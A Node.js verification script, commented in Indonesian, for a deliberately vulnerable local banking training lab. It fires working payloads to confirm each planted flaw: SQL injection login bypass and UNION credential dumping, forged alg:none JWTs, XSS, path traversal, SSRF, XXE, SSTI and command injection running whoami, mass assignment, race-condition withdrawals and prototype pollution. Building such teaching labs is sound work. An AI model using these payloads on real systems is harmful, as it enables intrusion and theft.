#!/usr/bin/env node
/**
 * Verifikasi lab Bank UBS.
 *
 * Jalankan setelah `npm run lab:reset`:
 *   npm run lab:verify
 *
 * Script ini MENGUBAH data lab (saldo, role, notes, tiket, upload, kupon).
 * Setelah selesai, jalankan `npm run lab:reset` lagi untuk kembali ke kondisi awal.
 */
import path from 'path';
import { pathToFileURL } from 'url';

const BASE = process.env.LAB_URL || 'http://127.0.0.1:3001';
const checks = [];

function check(name, ok, detail = '') {
  checks.push({ name, ok: !!ok });
  console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${detail ? ' — ' + String(detail).slice(0, 160) : ''}`);
}

function skip(name, reason = 'profil web') {
  console.log(`SKIP ${name} — ${reason}`);
}

async function request(urlPath, options = {}) {
  const response = await fetch(BASE + urlPath, options);
  const text = await response.text();
  let data = text;
  try {
    data = JSON.parse(text);
  } catch {
    // biarkan sebagai teks (HTML/CSV/SQLite)
  }
  return { response, status: response.status, data, text, headers: response.headers };
}

function json(body, headers = {}) {
  return {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  };
}

function put(body, headers = {}) {
  return {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body),
  };
}

function sidFrom(response) {
  const setCookie = response.headers.get('set-cookie') || '';
  const match = setCookie.match(/sid=([^;]+)/);
  return match ? match[1] : '';
}

function cookieHeader(sid) {
  return { Cookie: `sid=${sid}` };
}

function b64(value) {
  return Buffer.from(JSON.stringify(value)).toString('base64url');
}

async function login(username, password, extra = {}) {
  const result = await request('/api/auth/login', json({ username, password, ...extra }));
  return { ...result, sid: sidFrom(result.response), cookie: cookieHeader(sidFrom(result.response)) };
}

console.log(`=== Bank UBS Lab Verification ===`);
console.log(`Target: ${BASE}\n`);

const health = await request('/api/health');
check('health endpoint', health.status === 200 && health.data?.success, health.data?.profile);
const extreme = health.data?.profile === 'extreme';

const budiLogin = await login('budi', 'budi123');
check('login plaintext budi', budiLogin.status === 200 && budiLogin.data?.user?.username === 'budi');
check('cookie tidak HttpOnly/Secure', !/HttpOnly/i.test(budiLogin.response.headers.get('set-cookie') || '') && !/Secure/i.test(budiLogin.response.headers.get('set-cookie') || ''));

const badLogin = await login('budi', 'salah');
check('login salah ditolak', badLogin.status === 401);

const sqliLogin = await login("admin'--", 'x');
check('SQLi login admin', sqliLogin.status === 200 && sqliLogin.data?.user?.username === 'admin');
const adminCookie = sqliLogin.cookie;

const me = await request('/api/auth/me', { headers: budiLogin.cookie });
check('session cookie /me', me.status === 200 && me.data?.user?.username === 'budi');

const headerBypass = await request('/api/auth/me', { headers: { 'X-User-Id': '3' } });
check('auth bypass X-User-Id', headerBypass.status === 200 && headerBypass.data?.user?.username === 'admin');

const forged = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({
  sub: 3,
  username: 'admin',
  role: 'admin',
  mfa_verified: true,
})}.`;
const jwtBypass = await request('/api/auth/me', {
  headers: { Authorization: `Bearer ${forged}` },
});
check('JWT alg:none', jwtBypass.status === 200 && jwtBypass.data?.user?.username === 'admin');

const fixatedSid = `verify-fixated-${Date.now()}`;
await request(`/api/auth/session?sid=${encodeURIComponent(fixatedSid)}`);
const fixedLogin = await login('budi', 'budi123', { sid: fixatedSid });
const fixedMe = await request('/api/auth/me', { headers: cookieHeader(fixatedSid) });
check('session fixation', fixedLogin.status === 200 && fixedMe.status === 200 && fixedMe.data?.user?.username === 'budi');

const logoutLogin = await login('budi', 'budi123');
await request('/api/auth/logout', { method: 'POST', headers: logoutLogin.cookie });
const afterLogout = await request('/api/auth/me', { headers: logoutLogin.cookie });
check('logout tidak invalidasi session', afterLogout.status === 200);

const reflected = await login('<img src=x onerror=alert(1)>', 'x');
check(
  'reflected XSS login',
  reflected.status === 401 && String(reflected.data?.message || '').includes('<img src=x onerror=alert(1)>')
);

const notes = await request('/api/notes');
check('IDOR semua notes', notes.status === 200 && Array.isArray(notes.data?.notes) && notes.data.notes.length >= 4);

const adminUser = await request('/api/users/3');
check('IDOR user admin', adminUser.status === 200 && adminUser.data?.user?.username === 'admin');

const statement = await request('/api/users/3/statement');
check('IDOR statement', statement.status === 200 && Array.isArray(statement.data?.statements));

const transfers = await request('/api/transfers?user_id=2');
check('IDOR transfers', transfers.status === 200 && Array.isArray(transfers.data?.transfers));

const files = await request('/api/files');
check('IDOR file metadata', files.status === 200 && Array.isArray(files.data?.files) && files.data.files.length >= 4);

const tickets = await request('/api/support/tickets');
check('IDOR tickets', tickets.status === 200 && Array.isArray(tickets.data?.tickets) && tickets.data.tickets.length >= 3);

const unionPayload = "%' UNION SELECT 1,username,password,email,role,saldo FROM users--";
const union = await request(`/api/users/search?q=${encodeURIComponent(unionPayload)}`);
check(
  'SQLi UNION search',
  union.status === 200 &&
    Array.isArray(union.data?.users) &&
    union.data.users.some((user) => user.nama_lengkap === 'admin123')
);

const storedNote = await request(
  '/api/notes',
  json({ user_id: 1, content: '<img src=x onerror=alert(document.cookie)>verify-note' })
);
check('stored XSS notes', storedNote.status === 200 && storedNote.data?.success);

const storedTicket = await request(
  '/api/support/tickets',
  json({ user_id: 1, subject: '<svg onload=alert(1)>verify', message: '<img src=x onerror=alert(1)>' })
);
check('stored XSS support', storedTicket.status === 200 && storedTicket.data?.success);

const uploadName = `verify-xss-${Date.now()}.html`;
const uploadBody = new FormData();
uploadBody.append(
  'file',
  new Blob(['<html><body><script>document.title="pwned"</script>upload-xss</body></html>'], {
    type: 'text/html',
  }),
  uploadName
);
uploadBody.append('user_id', '1');
const upload = await request('/api/upload', { method: 'POST', body: uploadBody });
const uploadUrl = upload.data?.file?.url;
const uploaded = uploadUrl ? await request(uploadUrl) : null;
check(
  'unrestricted upload + stored XSS',
  upload.status === 200 &&
    uploadUrl?.endsWith('.html') &&
    uploaded?.status === 200 &&
    String(uploaded?.text).includes('upload-xss')
);

const traversal = await request('/api/files/download?name=../database.sqlite');
check('path traversal baca DB', traversal.status === 200 && traversal.text.startsWith('SQLite format 3'));

const packageUrl = pathToFileURL(path.join(process.cwd(), 'package.json')).href;
const ssrfFile = await request('/api/integrations/fetch', json({ url: packageUrl }));
check('SSRF file://', ssrfFile.status === 200 && String(ssrfFile.data?.body || '').includes('mbanking-vuln'));

const ssrfInternal = await request(
  '/api/integrations/fetch',
  json({ url: `${BASE}/api/internal/users` })
);
check(
  'SSRF ke endpoint internal',
  ssrfInternal.status === 200 && String(ssrfInternal.data?.body || '').includes('internal_api_key')
);

if (extreme) {
  const xxe = await request('/api/kyc/import', {
    method: 'POST',
    headers: { 'Content-Type': 'application/xml' },
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${packageUrl}">]><kyc><name>&xxe;</name></kyc>`,
  });
  check('XXE baca file', xxe.status === 200 && String(xxe.data?.expanded || '').includes('mbanking-vuln'));

  const ssti = await request('/api/notifications/preview', json({ template: '<%= 7 * 7 %>' }, budiLogin.cookie));
  check('SSTI render', ssti.status === 200 && ssti.data?.rendered === '49');

  const sstiRce = await request(
    '/api/notifications/preview',
    json({ template: "<%= require('child_process').execSync('whoami').toString() %>" }, budiLogin.cookie)
  );
  check('SSTI RCE', sstiRce.status === 200 && String(sstiRce.data?.rendered || '').trim().length > 0);

  const whoamiCommand = process.platform === 'win32' ? '127.0.0.1 & whoami' : '127.0.0.1; whoami';
  const command = await request('/api/admin/diagnostics/ping', json({ host: whoamiCommand }, adminCookie));
  check('command injection', command.status === 200 && String(command.data?.stdout || '').trim().length > 0, command.data?.stdout);
} else {
  skip('XXE');
  skip('SSTI');
  skip('command injection');
}

const newUsername = `verify-user-${Date.now()}`;
const register = await request(
  '/api/auth/register',
  json({ username: newUsername, password: 'verify123', role: 'admin', nama_lengkap: 'Verify User' })
);
check('mass assignment register role', register.status === 200 && register.data?.user?.role === 'admin');

const massAssign = await request('/api/users/1', put({ role: 'admin', saldo: 777 }));
check(
  'mass assignment profile',
  massAssign.status === 200 && massAssign.data?.user?.role === 'admin' && Number(massAssign.data?.user?.saldo) === 777
);

const coupon1 = await request('/api/coupons/redeem', json({ code: 'HEMAT50' }, budiLogin.cookie));
const coupon2 = await request('/api/coupons/redeem', json({ code: 'HEMAT50' }, budiLogin.cookie));
check('replay kupon', coupon1.status === 200 && coupon2.status === 200);

const bill = await request(
  '/api/bills/pay',
  json({ bill_id: 'TAGIHAN-VERIFY', amount: 1 }, budiLogin.cookie)
);
check('price tampering tagihan', bill.status === 200 && bill.data?.success);

const negative = await request(
  '/api/transfer?from_id=2&to_id=1&amount=-1000&note=verify-negative',
  { headers: budiLogin.cookie }
);
check('transfer negatif / CSRF', negative.status === 200 && negative.data?.success);

const withdrawIdor = await request(
  '/api/withdraw',
  json({ user_id: 2, amount: 1000 }, budiLogin.cookie)
);
check('withdraw IDOR user lain', withdrawIdor.status === 200 && withdrawIdor.data?.user?.id === 2);

const raceResults = await Promise.all(
  Array.from({ length: 4 }, () =>
    request('/api/withdraw', json({ user_id: 2, amount: 1000 }, budiLogin.cookie))
  )
);
check(
  'race condition withdraw',
  raceResults.filter((result) => result.status === 200).length >= 2,
  `${raceResults.filter((result) => result.status === 200).length}/4 sukses`
);

const redirect = await fetch(`${BASE}/api/auth/redirect?next=http://example.com`, { redirect: 'manual' });
check('open redirect', [301, 302, 303, 307, 308].includes(redirect.status) && redirect.headers.get('location') === 'http://example.com');

const cors = await request('/api/config', { headers: { Origin: 'http://evil.test' } });
check(
  'CORS reflect origin + credentials',
  cors.headers.get('access-control-allow-origin') === 'http://evil.test' &&
    cors.headers.get('access-control-allow-credentials') === 'true'
);

const root = await request('/');
const csp = root.headers.get('content-security-policy') || '';
check('clickjacking (tanpa XFO/CSP frame-ancestors)', !root.headers.get('x-frame-options') && !csp.includes('frame-ancestors'));

const backup = await request('/backup/database.sqlite');
check('backup DB publik', backup.status === 200 && backup.text.startsWith('SQLite format 3'));

const adminBackup = await request('/api/admin/backup');
check('backup DB via API admin', adminBackup.status === 200 && adminBackup.text.startsWith('SQLite format 3'));

const logFile = await request('/backup/app.log');
check('log publik berisi kredensial', logFile.status === 200 && logFile.text.includes('login attempt'));

const adminLogs = await request('/api/admin/logs');
check('log viewer tanpa auth', adminLogs.status === 200 && String(adminLogs.data?.logs || '').includes('login attempt'));

const config = await request('/api/config');
check('secret leak /api/config', config.status === 200 && config.data?.config?.jwt_secret === 'labsecret');

const docs = await request('/api/docs');
check('API docs terbuka', docs.status === 200 && Array.isArray(docs.data?.endpoints) && docs.data.endpoints.length >= 20);

const exportCsv = await request('/api/admin/export');
check('export CSV berisi password', exportCsv.status === 200 && String(exportCsv.text).includes('admin123'));

const sqlError = await request('/api/users/abc');
check('verbose SQL error', sqlError.status === 500 && String(sqlError.data?.error || '').includes('SQLITE_ERROR'));

// Prototype pollution harus dijalankan paling akhir karena mengubah Object.prototype.
const andiLogin = await login('andi', 'andi123');
const pollution = await request(
  '/api/profile/preferences',
  json('{"preferences":{"__proto__":{"isAdmin":true}}}', andiLogin.cookie)
);
const pollutedAdmin = await request('/api/admin/users/2/role', json({ role: 'customer' }, andiLogin.cookie));
check(
  'prototype pollution -> bypass admin',
  pollution.status === 200 && pollution.data?.prototype_isAdmin === true && pollutedAdmin.status === 200
);

const failed = checks.filter((item) => !item.ok);
console.log(`\n${checks.length - failed.length}/${checks.length} checks lulus.`);
if (failed.length) {
  console.log('Gagal:', failed.map((item) => item.name).join(', '));
  console.log('Catatan: jalankan `npm run lab:reset` lalu ulangi jika state lab sudah berubah.');
  process.exit(1);
}
console.log('Semua fitur rentan terdeteksi. Jalankan `npm run lab:reset` untuk membersihkan state.');
